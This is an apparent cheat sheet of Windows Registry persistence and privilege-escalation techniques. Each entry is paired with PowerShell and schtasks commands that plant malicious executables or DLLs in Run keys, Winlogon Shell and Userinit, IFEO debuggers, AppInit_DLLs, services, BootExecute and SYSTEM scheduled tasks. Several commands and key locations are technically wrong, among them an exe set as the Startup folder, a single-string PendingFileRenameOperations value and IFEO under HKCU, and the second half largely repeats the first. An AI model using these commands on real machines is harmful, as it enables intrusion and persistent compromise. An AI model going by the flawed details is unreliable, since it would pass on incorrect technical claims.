Here is a comprehensive and detailed breakdown of Windows Registry values that are commonly targeted for persistence and privilege escalation. By exploiting these registry keys, attackers can achieve both persistence and privilege escalation on Windows systems. Each key plays a significant role in system behavior, and careful monitoring of these registry entries is crucial in detecting and preventing attacks.

# Persistence

Here’s a focused list of Windows registry keys that can be leveraged for persistence on a compromised system using PowerShell. Persistence involves ensuring that malicious code or programs are executed automatically after reboot or at regular intervals without user intervention.

#### Run/RunOnce Keys
   - Registry Path:
     - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
     - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
     - `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
     - `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
   - Purpose: These keys are used to run programs automatically during startup (Run) or during the next login (RunOnce).
   - Abuse: Malicious code can be added to these keys to ensure it runs automatically at system startup or user login.

   PowerShell Example to Add Malicious Entry:
   ```powershell
   # Adding a persistence entry for the current user
   Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MaliciousApp" -Value "C:\path\to\malicious.exe"

   # Adding a persistence entry for the system (all users)
   Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MaliciousApp" -Value "C:\path\to\malicious.exe"
   ```

#### Startup Folder Registry Key
   - Registry Path:
     - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
     - `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
   - Purpose: Defines folder paths for user-specific and system-wide startup items.
   - Abuse: Attackers can modify these registry values to point to a directory containing malicious scripts or executables, ensuring that they launch at user login.

   PowerShell Example to Set Malicious Startup Path:
   ```powershell
   Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "C:\path\to\malicious.exe"
   ```

#### Services (Persistent Service Creation)
   - Registry Path:
     - `HKLM\SYSTEM\CurrentControlSet\Services\`
   - Purpose: Used to store configuration data for system services.
   - Abuse: By creating or modifying a service to run a malicious executable, an attacker can ensure that the malicious program runs automatically with system-level privileges on startup.

   PowerShell Example to Create a Malicious Service:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\MaliciousService" -Name "ImagePath" -Value "C:\path\to\malicious.exe"
   ```

#### ShellServiceObjectDelayLoad (DLL Persistence)
   - Registry Path:
     - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad`
   - Purpose: Specifies DLLs that are loaded during the initialization of the Windows shell (explorer.exe).
   - Abuse: By adding a malicious DLL to this key, attackers can achieve persistence, ensuring their code is executed during the startup of the shell process.

   PowerShell Example to Add Malicious DLL:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad" -Name "MaliciousDLL" -Value "C:\path\to\malicious.dll"
   ```

#### Userinit (Logon Script Hijacking)
   - Registry Path:
     - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`
   - Purpose: Defines programs that run automatically when a user logs in (by default, it’s `userinit.exe`).
   - Abuse: Attackers can modify this key to add additional malicious code or replace the default `userinit.exe` with a malicious executable that runs at every login.

   PowerShell Example to Modify Userinit:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "C:\path\to\malicious.exe"
   ```

#### AppInit_DLLs (DLL Injection for Persistence)
   - Registry Path:
     - `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs`
   - Purpose: Defines DLLs to be loaded into every user-mode process.
   - Abuse: Attackers can specify a malicious DLL in this key to ensure that it gets injected into any user-mode process, running with elevated privileges.

   PowerShell Example to Add Malicious DLL:
   ```powershell
   Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -Value "C:\path\to\malicious.dll"
   ```

#### Winlogon Shell (Hijacking the Default Shell for Persistence)
   - Registry Path:
     - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`
   - Purpose: Defines the default shell (usually `explorer.exe`) that is loaded when a user logs in.
   - Abuse: By replacing `explorer.exe` with a malicious executable, an attacker can execute their code with SYSTEM privileges upon user login.

   PowerShell Example to Replace Default Shell:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "C:\path\to\malicious.exe"
   ```

#### PendingFileRenameOperations (Persistence Through File Replacement)
   - Registry Path:
     - `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\PendingFileRenameOperations`
   - Purpose: Specifies files that are renamed or deleted during the next system reboot.
   - Abuse: An attacker can replace critical system files with malicious versions by adding their operations to this key, ensuring persistence after reboot.

   PowerShell Example to Add Malicious File Operation:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "PendingFileRenameOperations" -Value "C:\path\to\maliciousfile.exe"
   ```

#### Active Setup (Run Programs at User Login)
   - Registry Path:
     - `HKLM\Software\Microsoft\Active Setup\Installed Components`
     - `HKCU\Software\Microsoft\Active Setup\Installed Components`
   - Purpose: Allows programs to be run when a new user logs into the system for the first time.
   - Abuse: Attackers can add malicious programs to be executed every time a new user logs in, ensuring persistence for all users on the machine.

   PowerShell Example to Add Malicious Program:
   ```powershell
   New-Item -Path "HKCU:\Software\Microsoft\Active Setup\Installed Components\MaliciousComponent" -Force
   Set-ItemProperty -Path "HKCU:\Software\Microsoft\Active Setup\Installed Components\MaliciousComponent" -Name "StubPath" -Value "C:\path\to\malicious.exe"
   ```

#### Task Scheduler (Registry Keys for Scheduled Tasks)
   - Registry Path:
     - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks`
   - Purpose: Specifies tasks that are automatically executed by the Windows Task Scheduler.
   - Abuse: Attackers can create or modify scheduled tasks using the registry to ensure that their malicious code is run at specific intervals or during specific system events (e.g., user login).

   PowerShell Example to Create a Scheduled Task:
   ```powershell
   schtasks /create /tn "MaliciousTask" /tr "C:\path\to\malicious.exe" /sc onlogon /ru SYSTEM
   ```

#### Load (Logon Persistence via Registry Load Key)
   - Registry Path:
     - `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load`
   - Purpose: Specifies applications that are automatically loaded when a user logs in.
   - Abuse: Attackers can add entries to this key to ensure that their malicious programs are loaded at every user login.

   PowerShell Example to Add Malicious Program:
   ```powershell
   Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "Load" -Value "C:\path\to\malicious.exe"
   ```

#### IFEO (Image File Execution Options for Debugger Hijacking)
   - Registry Path:
     - `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\`
     - `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\`
   - Purpose

: Allows setting a debugger to launch instead of specific applications.
   - Abuse: By specifying a malicious executable as a debugger, an attacker can ensure that the malicious code is executed every time the targeted application is launched, achieving persistence.

   PowerShell Example to Set Debugger for Persistence:
   ```powershell
   Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" -Name "Debugger" -Value "C:\path\to\malicious.exe"
   ```

#### AppCompatFlags (Application Compatibility Persistence)
   - Registry Path:
     - `HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers`
   - Purpose: Used for application compatibility settings.
   - Abuse: Attackers can add malicious entries that force specific programs to run with elevated privileges or bypass User Account Control (UAC), ensuring persistence.

   PowerShell Example to Add AppCompat Entry:
   ```powershell
   Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Name "C:\path\to\application.exe" -Value "~ RUNASADMIN"
   ```

#### Notify (GINA DLL Persistence)
   - Registry Path:
     - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify`
   - Purpose: Specifies DLLs that the system loads during the login process for GINA (Graphical Identification and Authentication).
   - Abuse: An attacker can load malicious DLLs at login, ensuring persistence by injecting code into the login process.

   PowerShell Example to Add Malicious Notify DLL:
   ```powershell
   New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\MaliciousNotify" -Force
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\MaliciousNotify" -Name "DLLName" -Value "C:\path\to\malicious.dll"
   ```

# Privilege Escalation

#### AutoRun Keys (Persistence and Privilege Escalation)
   - Registry Path:
     - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
     - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
   - Purpose: Allows programs to be run automatically at startup.
   - Abuse: If these keys are writable by non-admin users, an attacker can add an executable or script to be executed with elevated privileges upon system startup or user login.

   PowerShell Example to Check Permissions:
   ```powershell
   Get-Acl "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Format-List
   Get-Acl "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Format-List
   ```

   PowerShell Example to Add Entry:
   ```powershell
   Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MaliciousApp" -Value "C:\path\to\malicious.exe"
   ```

#### Services (Service Configuration Hijacking)
   - Registry Path:
     - `HKLM\SYSTEM\CurrentControlSet\Services\`
   - Purpose: Stores configuration settings for Windows services.
   - Abuse: If a service’s configuration can be modified by a non-admin user, an attacker can change the executable path of a service to run a malicious binary with SYSTEM privileges.

   PowerShell Example to Identify Writable Services:
   ```powershell
   Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\*" | Format-List
   ```

   PowerShell Example to Modify Service:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName" -Name "ImagePath" -Value "C:\path\to\malicious.exe"
   ```

#### AlwaysInstallElevated (Installer Privilege Escalation)
   - Registry Path:
     - `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
     - `HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
   - Purpose: Allows Windows installers to run with elevated privileges.
   - Abuse: If both the `HKCU` and `HKLM` keys are set to `1`, any MSI package can be installed with elevated privileges, allowing privilege escalation by installing a malicious MSI.

   PowerShell Example to Check Values:
   ```powershell
   Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
   Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
   ```

   PowerShell Example to Exploit:
   ```powershell
   msiexec /quiet /qn /i C:\path\to\malicious.msi
   ```

#### Scheduled Tasks (Abusing Weak Permissions)
   - Registry Path:
     - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`
   - Purpose: Stores configuration for Windows Scheduled Tasks.
   - Abuse: If non-admin users have write permissions, they can modify existing tasks or create new tasks that execute with SYSTEM privileges.

   PowerShell Example to Check Permissions:
   ```powershell
   Get-Acl -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree" | Format-List
   ```

   PowerShell Example to Create/Modify Task:
   ```powershell
   schtasks /create /tn "MaliciousTask" /tr "C:\path\to\malicious.exe" /sc onlogon /ru SYSTEM
   ```

#### Shell Extensions (Hijacking for Privilege Escalation)
   - Registry Path:
     - `HKLM\Software\Classes\*\shell`
     - `HKLM\Software\Classes\Directory\shell`
     - `HKCU\Software\Classes\*\shell`
     - `HKCU\Software\Classes\Directory\shell`
   - Purpose: Allows programs to be run via shell context menus.
   - Abuse: If these keys are writable, an attacker can add entries to the context menu that execute arbitrary code with elevated privileges.

   PowerShell Example to Check Permissions:
   ```powershell
   Get-Acl -Path "HKLM:\Software\Classes\*\shell" | Format-List
   Get-Acl -Path "HKCU:\Software\Classes\*\shell" | Format-List
   ```

   PowerShell Example to Add Malicious Entry:
   ```powershell
   New-Item -Path "HKCU:\Software\Classes\*\shell\OpenMalicious" -Force
   Set-ItemProperty -Path "HKCU:\Software\Classes\*\shell\OpenMalicious" -Name "command" -Value "C:\path\to\malicious.exe"
   ```

#### AppInit_DLLs (DLL Hijacking)
   - Registry Path:
     - `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs`
   - Purpose: Specifies DLLs that are loaded by user-mode processes at startup.
   - Abuse: By adding a malicious DLL to this key, an attacker can ensure the DLL is loaded into any process that starts on the system, potentially with SYSTEM privileges.

   PowerShell Example to Check Values:
   ```powershell
   Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs"
   ```

   PowerShell Example to Add Malicious DLL:
   ```powershell
   Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -Value "C:\path\to\malicious.dll"
   ```

#### UserInit (Login Script Hijacking)
   - Registry Path:
     - `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\UserInit`
   - Purpose: Specifies programs that are run when a user logs in.
   - Abuse: By modifying the `UserInit` key, an attacker can ensure that malicious code is executed every time a user logs in, potentially with SYSTEM privileges.

   PowerShell Example to Check Value:
   ```powershell
   Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "UserInit"
   ```

   PowerShell Example to Add Malicious Entry:
   ```powershell
   Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "UserInit" -Value "C:\path\to\malicious.exe"
   ```

#### Image File Execution Options (Debugger Hijacking)
   - Registry Path:
     - `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\`
   - Purpose: Used to specify a debugger to be attached to specific executables.
   - Abuse: An attacker can set a debugger to launch instead of a legitimate program, running malicious code with SYSTEM privileges.

   PowerShell Example to Check Existing Debugger Keys:
   ```powershell
   Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
   ```

   PowerShell Example to Set Debugger:
   ```powershell
   Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" -Name "Debugger" -Value "C:\path\to\malicious.exe"
   ```

#### Startup Folder (Persistence and Privilege Escalation)
   - Registry Path:
     - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
   - Purpose: Specifies the paths for folders used by the system for user profiles and startup applications.
   - Abuse: If an attacker can write to the startup folder, they can place malicious programs that will execute automatically on login.

   PowerShell Example to Check Permissions:
   ```powershell
   Get-Acl -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" | Format-List
   ```

   PowerShell Example to Add Malicious Startup Entry:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "C:\path\to\malicious.exe"
   ```

#### BootExecute (Boot Process Hijacking)
   - Registry Path:
     - `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute`
   - Purpose: Used to specify commands that are executed at system startup, usually related to defragmentation and system repair.
   - Abuse: By modifying this key, an attacker can execute arbitrary commands or binaries with SYSTEM privileges during the boot process.

   PowerShell Example to Check Value:
   ```powershell
   Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "BootExecute"
   ```

   PowerShell Example to Modify BootExecute:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "BootExecute" -Value "C:\path\to\malicious.exe"
   ```

#### Winlogon Shell (Hijacking User Interface)
   - Registry Path:
     - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`
   - Purpose: Defines the shell that is loaded when a user logs in (usually `explorer.exe`).
   - Abuse: An attacker can replace the default shell with a malicious program, which will execute with SYSTEM privileges when the user logs in.

   PowerShell Example to Check Value:
   ```powershell
   Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell"
   ```

   PowerShell Example to Modify Shell:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "C:\path\to\malicious.exe"
   ```

#### Load (Hijacking Processes at User Logon)
   - Registry Path:
     - `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\Load`
   - Purpose: Specifies programs to be run automatically when a user logs in.
   - Abuse: If this key is writable, an attacker can add malicious code to be executed at user login with elevated privileges.

   PowerShell Example to Check Value:
   ```powershell
   Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "Load"
   ```

   PowerShell Example to Add Malicious Entry:
   ```powershell
   Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "Load" -Value "C:\path\to\malicious.exe"
   ```

#### ShellServiceObjectDelayLoad (DLL Hijacking)
   - Registry Path:
     - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad`
   - Purpose: Specifies DLLs to be loaded during the initialization of the shell.
   - Abuse: By adding a malicious DLL, an attacker can execute code at system startup with elevated privileges.

   PowerShell Example to Check Value:
   ```powershell
   Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad"
   ```

   PowerShell Example to Add Malicious DLL:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad" -Name "MaliciousDLL" -Value "C:\path\to\malicious.dll"
   ```

#### Session Manager Subsystems (Subsystem Hijacking)
   - Registry Path:
     - `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Subsystems`
   - Purpose: Configures the subsystems that Windows loads during the startup process.
   - Abuse: By modifying the `Debugger` value, an attacker can replace legitimate subsystems with a malicious binary or command that runs with SYSTEM privileges.

   PowerShell Example to Check Value:
   ```powershell
   Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Subsystems"
   ```

   PowerShell Example to Add Malicious Entry:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Subsystems" -Name "Debugger" -Value "C:\path\to\malicious.exe"
   ```

#### PendingFileRenameOperations (Modify Pending File Operations)
   - Registry Path:
     - `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\PendingFileRenameOperations`
   - Purpose: Specifies files to be renamed or deleted during the next system reboot.
   - Abuse: If this key is writable, an attacker can add file operations that execute at system reboot, including replacing critical system files.

   PowerShell Example to Check Pending Operations:
   ```powershell
   Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "PendingFileRenameOperations"
   ```

   PowerShell Example to Modify Pending Operations:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "PendingFileRenameOperations" -Value "C:\path\to\replacefile.exe"
   ```

#### Task Scheduler (Persistence and Escalation)
   - Registry Path:
     - `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\`
   - Purpose: Stores configuration for scheduled tasks.
   - Abuse: Attackers can create tasks that execute malicious code on a scheduled interval or on system events like login, potentially running with SYSTEM or higher privileges.

   PowerShell Example to Check Permissions:
   ```powershell
   Get-Acl -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks" | Format-List
   ```

   PowerShell Example to Create a New Task:
   ```powershell
   schtasks /create /tn "MaliciousTask" /tr "C:\path\to\malicious.exe" /sc onlogon /ru SYSTEM
   ```

#### UserInitMprLogonScript (Script Hijacking at Logon)
   - Registry Path:
     - `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\UserInitMprLogonScript`
   - Purpose: Allows users to specify scripts to run when logging into the system.
   - Abuse: If this key is writable, an attacker can add a script to be executed on user login, potentially running with elevated privileges.

   PowerShell Example to Check Value:
   ```powershell
   Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "UserInitMprLogonScript"
   ```

   PowerShell Example to Add Malicious Script:
   ```powershell
   Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "UserInitMprLogonScript" -Value "C:\path\to\malicious.ps1"
   ```

#### Notify (Abusing GINA Notification DLLs)
   - Registry Path:
     - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\`
   - Purpose: Defines DLLs that the system loads for GINA (Graphical Identification and Authentication) extensions.
   - Abuse: If an attacker can write to this key, they can inject a malicious DLL that is loaded during the login process, executing with SYSTEM privileges.

   PowerShell Example to Check Notify DLLs:
   ```powershell
   Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
   ```

   PowerShell Example to Add Malicious DLL:
   ```powershell
   New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\MaliciousDLL" -Force
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\MaliciousDLL" -Name "DLLName" -Value "C:\path\to\malicious.dll"
   ```

#### AppCompatFlags (Application Compatibility Hijacking)
   - Registry Path:
     - `HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers`
   - Purpose: Specifies application compatibility settings.
   - Abuse: Attackers can modify this key to run applications with compatibility settings that may bypass User Account Control (UAC) and allow privilege escalation.

   PowerShell Example to Check Value:
   ```powershell
   Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
   ```

   PowerShell Example to Add Malicious Entry:
   ```powershell
   Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Name "C:\path\to\application.exe" -Value "~ RUNASADMIN"
   ```

#### IFEO (Image File Execution Options) Debugger Keys (Debugger Hijacking)
   - Registry Path:
     - `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\`
   - Purpose: Used to launch a debugger in place of a legitimate application.
   - Abuse: Attackers can set a malicious executable as a debugger, forcing it to be executed instead of the legitimate program when it is run.

   PowerShell Example to Set Debugger:
   ```powershell
   Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" -Name "Debugger" -Value "C:\path\to\malicious.exe"
   ```
